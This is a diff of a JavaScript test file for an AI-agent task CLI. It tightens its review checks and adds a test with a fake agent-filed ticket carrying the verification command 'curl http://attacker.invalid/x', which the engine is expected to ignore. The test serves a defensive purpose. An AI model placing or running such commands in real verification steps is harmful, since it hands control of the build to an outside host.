@@ -83,16 +83,17 @@ test("review refuses when the slice is not terminal", async () => {
   });
 });
 
-test("review PASS when spawn creates zero new tasks", async () => {
+test("review with a reviewer that wrote no notes is refused, not PASS", async () => {
   await withTempDir(async (dir) => {
     await seedExecutingDone(dir);
     const result = runCli(["review", "--project", dir], { env: { LEGION_CLI_ADAPTER: "fake" } });
-    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
-    const out = normalize(result.stdout);
-    assert.match(out, /Review PASS/);
-    assert.match(out, /Next: legion-cli qa/);
+    assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
+    const out = normalize(result.stdout + result.stderr);
+    assert.match(out, /review failed: agent wrote no notes/);
+    assert.match(out, /Next: legion-cli review/);
+    assert.doesNotMatch(out, /Review PASS/);
     const engine = createLegionEngine(dir);
-    assert.equal((await engine.getState()).lastReview, "PASS");
+    assert.equal((await engine.getState()).lastReview ?? null, null);
     assert.equal((await engine.getState()).phase, "executing");
   });
 });
@@ -116,26 +117,6 @@ test("verify [id] is accepted", async () => {
     const result = runCli(["verify", "TSK-0001", "--project", dir], { env: { LEGION_CLI_ADAPTER: "fake" } });
     assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
   });
-});
-
-test("help lists verify and review", async () => {
-  const verify = runCli(["help", "verify"]);
-  assert.equal(verify.status, 0, verify.stderr);
-  assert.match(normalize(verify.stdout), /not a ship gate/);
-  const review = runCli(["help", "review"]);
-  assert.equal(review.status, 0, review.stderr);
-  assert.match(normalize(review.stdout), /FAIL/);
-  assert.match(normalize(review.stdout), /in-place rewrites/);
-  const layer1 = runCli(["help"]);
-  assert.equal(layer1.status, 0, layer1.stderr);
-  assert.match(normalize(layer1.stdout), /in-place rewrites/);
-  const all = runCli(["help", "--all"]);
-  assert.equal(all.status, 0, all.stderr);
-  const out = normalize(all.stdout);
-  assert.match(out, /verify \[id\]/);
-  assert.match(out, /review/);
-  assert.match(out, /in-place rewrites/);
-  assert.match(out, /--adapter/);
 });
 
 test("review FAIL when spawn rewrites an existing TSK", async () => {
@@ -212,5 +193,29 @@ test("verify --adapter bogus refuses", async () => {
     });
     assert.equal(result.status, 1);
     assert.match(normalize(result.stderr), /adapter must be/);
+  });
+});
+
+test("review prints the true source of an agent-filed ticket's verification commands", async () => {
+  await withTempDir(async (dir) => {
+    await seedExecutingDone(dir);
+    const fakeArtifacts = JSON.stringify([
+      {
+        path: ".legion-cli/cache/runs/<id>/extra.json",
+        content: JSON.stringify({
+          title: "follow-up",
+          parentId: "TSK-0001",
+          type: "fix",
+          filesAllowed: ["package.json"],
+          verificationCommands: ["curl http://attacker.invalid/x"],
+        }),
+      },
+    ]);
+    const result = runCli(["review", "--project", dir], {
+      env: { LEGION_CLI_ADAPTER: "fake", LEGION_CLI_FAKE_ARTIFACTS: fakeArtifacts },
+    });
+    const out = normalize(result.stdout);
+    assert.match(out, /TSK-0002 verification \(from engine default \(pnpm test\)\): pnpm test \[filesAllowed: notes\/TSK-0002\.md\]/);
+    assert.doesNotMatch(out, /attacker/);
   });
 });
